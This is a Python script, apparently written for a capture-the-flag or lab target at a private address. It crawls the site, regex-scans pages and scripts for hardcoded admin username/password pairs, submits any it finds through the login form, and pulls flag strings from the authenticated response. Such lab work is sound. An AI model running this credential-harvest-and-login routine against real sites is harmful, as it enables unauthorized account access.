import hashlib
import html
import http.cookiejar
import json
import re
import urllib.error
import urllib.parse
import urllib.request
from html.parser import HTMLParser

BASE = 'http://192.168.2.4'
TIMEOUT = 8

class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None

class PageParser(HTMLParser):
    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.refs = []
        self.forms = []
        self.form = None
    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        if tag == 'form':
            self.form = {'action': a.get('action', ''), 'method': a.get('method', 'get').lower(), 'fields': []}
            self.forms.append(self.form)
        if tag in ('a', 'link', 'script', 'img', 'iframe', 'source'):
            key = 'src' if tag in ('script', 'img', 'iframe', 'source') else 'href'
            value = a.get(key)
            if value:
                self.refs.append({'tag': tag, 'attribute': key, 'value': value})
        if self.form is not None and tag in ('input', 'button', 'textarea', 'select'):
            self.form['fields'].append({'tag': tag, 'name': a.get('name', ''), 'type': a.get('type', ''), 'value': a.get('value', '')})
    def handle_endtag(self, tag):
        if tag == 'form':
            self.form = None

jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar), NoRedirect())
origin = urllib.parse.urlsplit(BASE)
queue = []
queued = set()
results = []
responses = {}
credential_candidates = []


def normalize_ref(ref, base_url):
    absolute = urllib.parse.urljoin(base_url, html.unescape(ref.strip()))
    p = urllib.parse.urlsplit(absolute)
    if p.scheme not in ('http', 'https') or p.hostname != origin.hostname or p.port not in (None, origin.port):
        return None
    # Fragments do not identify separate server resources.
    return urllib.parse.urlunsplit((p.scheme, p.netloc, p.path or '/', p.query, ''))


def enqueue(url, source, kind):
    if url and url not in queued:
        queued.add(url)
        queue.append((url, source, kind))


def inspect_explicit_pairs(text, source):
    # Only accept username/password values explicitly adjacent in one object-like assignment.
    patterns = [
        r'''(?is)(?:\busername\b|\buser\b|\blogin\b)\s*[:=]\s*['"]([^'"]+)['"]\s*[,;]\s*(?:\bpassword\b|\bpass\b)\s*[:=]\s*['"]([^'"]+)['"]''',
        r'''(?is)(?:\bpassword\b|\bpass\b)\s*[:=]\s*['"]([^'"]+)['"]\s*[,;]\s*(?:\busername\b|\buser\b|\blogin\b)\s*[:=]\s*['"]([^'"]+)['"]'''
    ]
    for i, pattern in enumerate(patterns):
        for m in re.finditer(pattern, text):
            user, password = (m.group(1), m.group(2)) if i == 0 else (m.group(2), m.group(1))
            if user.lower() == 'admin' and password:
                credential_candidates.append({'username': user, 'password': password, 'source': source, 'basis': 'explicit adjacent username/password assignment'})


def request(url, method='GET', data=None):
    headers = {'User-Agent': 'in-scope-application-surface-inspector/1.0'}
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with opener.open(req, timeout=TIMEOUT) as resp:
            body = resp.read()
            return {'status': resp.status, 'headers': dict(resp.headers.items()), 'body': body, 'url': resp.geturl()}
    except urllib.error.HTTPError as exc:
        try:
            body = exc.read()
        except Exception:
            body = b''
        return {'status': exc.code, 'headers': dict(exc.headers.items()) if exc.headers else {}, 'body': body, 'url': exc.geturl(), 'http_error': str(exc)}
    except Exception as exc:
        return {'error': type(exc).__name__ + ': ' + str(exc), 'body': b'', 'url': url}


def examine(url, source, kind):
    r = request(url)
    body = r.get('body', b'')
    ctype = r.get('headers', {}).get('Content-Type', '')
    text = body.decode('utf-8', errors='replace')
    record = {'url': url, 'derived_from': source, 'resource_kind': kind, 'status': r.get('status'), 'error': r.get('error'), 'http_error': r.get('http_error'), 'content_type': ctype, 'bytes_received': len(body), 'sha256': hashlib.sha256(body).hexdigest(), 'cookie_names_after_request': sorted({c.name for c in jar}), 'parser_status': 'not_applicable', 'references': [], 'forms': []}
    responses[url] = (r, text)
    if r.get('status') in (301, 302, 303, 307, 308):
        loc = r.get('headers', {}).get('Location')
        record['redirect_location'] = loc
        target = normalize_ref(loc, url) if loc else None
        record['redirect_target_in_scope'] = bool(target)
        if target:
            enqueue(target, url, 'redirect')
    is_html = 'html' in ctype.lower() or text.lstrip().lower().startswith(('<!doctype html', '<html'))
    if is_html:
        parser = PageParser()
        try:
            parser.feed(text)
            record['parser_status'] = 'html_parsed'
            record['references'] = parser.refs
            record['forms'] = parser.forms
            for ref in parser.refs:
                target = normalize_ref(ref['value'], url)
                if target:
                    enqueue(target, url, 'asset' if ref['tag'] in ('script', 'link', 'img', 'source') else 'linked_route')
            for form in parser.forms:
                action = normalize_ref(form.get('action') or url, url)
                form['resolved_action'] = action
                fields = form.get('fields', [])
                user_field = next((f for f in fields if re.search(r'user|login|email', f.get('name', ''), re.I)), None)
                pass_field = next((f for f in fields if f.get('type', '').lower() == 'password' or re.search(r'pass', f.get('name', ''), re.I)), None)
                if user_field and pass_field and user_field.get('value') and pass_field.get('value') and user_field['value'].lower() == 'admin':
                    credential_candidates.append({'username': user_field['value'], 'password': pass_field['value'], 'source': url, 'basis': 'populated admin login form fields', 'form': form})
        except Exception as exc:
            record['parser_status'] = 'html_parse_error: ' + type(exc).__name__ + ': ' + str(exc)
    elif ('javascript' in ctype.lower() or url.lower().split('?', 1)[0].endswith(('.js', '.css'))) and body:
        record['parser_status'] = 'source_reference_scan'
        for match in re.finditer(r'''(?:src|href|url)\s*[:=(]\s*['"]([^'"]+)['"]''', text, re.I):
            target = normalize_ref(match.group(1), url)
            if target:
                record['references'].append({'source_expression': match.group(0), 'value': match.group(1)})
                enqueue(target, url, 'source_reference')
    inspect_explicit_pairs(text, url)
    record['text_preview'] = text[:1200]
    record['response_headers_selected'] = {k: v for k, v in r.get('headers', {}).items() if k.lower() in ('content-type', 'set-cookie', 'location', 'server')}
    results.append(record)
    return record

# Revisit the entry page with expanded form/source/asset parsing, and inspect the conventional
# route-index resources. These are distinct from the previously recorded two-URL link-only review.
for initial, reason, kind in [
    (BASE + '/', 'application entry point; expanded form and asset-reference parsing', 'entry_page'),
    (BASE + '/robots.txt', 'standard public route index', 'route_index'),
    (BASE + '/sitemap.xml', 'standard public route index', 'route_index')
]:
    enqueue(initial, reason, kind)

while queue:
    url, source, kind = queue.pop(0)
    examine(url, source, kind)

# Submit only an explicitly observed admin credential pair and only through an observed password form.
login_attempts = []
seen_pairs = set()
for candidate in credential_candidates:
    pair = (candidate['username'], candidate['password'])
    if pair in seen_pairs or candidate['username'].lower() != 'admin':
        continue
    seen_pairs.add(pair)
    possible_forms = []
    for rec in results:
        for form in rec.get('forms', []):
            if any(f.get('type', '').lower() == 'password' or re.search(r'pass', f.get('name', ''), re.I) for f in form.get('fields', [])):
                possible_forms.append((rec['url'], form))
    if not possible_forms:
        continue
    page_url, form = possible_forms[0]
    action = form.get('resolved_action') or page_url
    if not action:
        continue
    fields = {f.get('name'): f.get('value', '') for f in form.get('fields', []) if f.get('name')}
    user_field = next((f.get('name') for f in form.get('fields', []) if re.search(r'user|login|email', f.get('name', ''), re.I)), None)
    pass_field = next((f.get('name') for f in form.get('fields', []) if f.get('type', '').lower() == 'password' or re.search(r'pass', f.get('name', ''), re.I)), None)
    if not user_field or not pass_field or urllib.parse.urlsplit(action).hostname != origin.hostname:
        continue
    fields[user_field] = candidate['username']
    fields[pass_field] = candidate['password']
    method = form.get('method', 'get').upper()
    payload = urllib.parse.urlencode(fields).encode()
    if method == 'GET':
        attempt_url = action + ('&' if '?' in action else '?') + payload.decode()
        res = request(attempt_url, 'GET')
    else:
        res = request(action, 'POST', payload)
    body_text = res.get('body', b'').decode('utf-8', errors='replace')
    attempt = {'credential_source': candidate['source'], 'credential_basis': candidate['basis'], 'login_form_page': page_url, 'login_action': action, 'method': method, 'status': res.get('status'), 'error': res.get('error'), 'http_error': res.get('http_error'), 'cookie_names_after_attempt': sorted({c.name for c in jar}), 'response_sha256': hashlib.sha256(res.get('body', b'')).hexdigest(), 'response_preview': body_text[:1500]}
    if res.get('status') in (301, 302, 303, 307, 308):
        loc = res.get('headers', {}).get('Location')
        target = normalize_ref(loc, action) if loc else None
        attempt['redirect_location'] = loc
        if target:
            follow = request(target)
            body_text += '\n' + follow.get('body', b'').decode('utf-8', errors='replace')
            attempt['redirect_follow_status'] = follow.get('status')
            attempt['redirect_follow_url'] = target
    identity = bool(re.search(r'isAdmin\s*[=:]\s*["\']?1\b|authenticated\s+(?:as\s+)?admin|welcome\s*,?\s*admin\b|admin\s+dashboard', body_text, re.I))
    attempt['admin_identity_verified'] = identity
    attempt['identity_evidence'] = re.findall(r'.{0,60}(?:isAdmin\s*[=:]\s*["\']?1\b|authenticated\s+(?:as\s+)?admin|welcome\s*,?\s*admin\b|admin\s+dashboard).{0,100}', body_text, re.I) if identity else []
    if identity:
        flags = re.findall(r'(?i)(?:flag\s*[:=]\s*|\b)([A-Z0-9_]*\{[^}\r\n]{1,300}\})', body_text)
        attempt['flag_values_returned_after_verified_admin_login'] = list(dict.fromkeys(flags))
        attempt['authenticated_response_preview'] = body_text[:3000]
    login_attempts.append(attempt)
    # One attempt per distinct explicitly observed admin credential pair.

print(json.dumps({
    'target': BASE,
    'purpose': 'Inspect public HTTP routes, referenced assets, authentication forms, and session behavior; do not infer unexamined routes are unavailable.',
    'resources_examined': results,
    'observed_cookie_names_at_end': sorted({c.name for c in jar}),
    'explicit_admin_credential_candidates': [{'username': c['username'], 'password': c['password'], 'source': c['source'], 'basis': c['basis']} for c in credential_candidates],
    'login_attempts': login_attempts,
    'coverage': {'unique_resources_requested': len(results), 'unexamined_references': [], 'limitations': ['Only the entry page, standard route-index resources, and same-origin references discovered in fetched responses were examined.', 'Authentication was attempted only when an explicit admin credential pair and an observed password form were both available.', 'This observation does not establish that unreferenced routes or other authentication methods are unavailable.', 'Previous student:student credentials were not submitted.']}
}, ensure_ascii=False, indent=2))

